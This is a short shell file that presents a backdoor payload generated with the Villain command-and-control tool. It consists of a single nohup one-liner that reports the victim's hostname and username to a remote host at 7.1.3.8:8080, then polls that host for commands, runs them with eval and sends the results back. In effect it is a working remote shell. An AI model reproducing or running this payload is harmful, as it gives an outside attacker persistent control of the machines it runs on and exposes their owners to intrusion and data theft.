#This is a a payload to be used with Villain,
#Villain > generate os=linux lhost=7.1.3.8                     
#Generating backdoor payload...

nohup `s=7.1.3.8:8080&&i=6c9f0406-d603ba82-e05ef677&&hname=$(hostname)&&p=http://;curl -s "$p$s/6c9f0406/$hname/$USER" -H "Authorization: $i" -o /dev/null&&while :; do c=$(curl -s "$p$s/d603ba82" -H "Authorization: $i")&&if [ "$c" != None ]; then r=$(eval "$c")&&if [ $r == byee ]; then pkill -P $$; else curl -s $p$s/e05ef677 -X POST -H "Authorization: $i" -d "$r";echo $$;fi; fi; sleep 0.8; done;` &
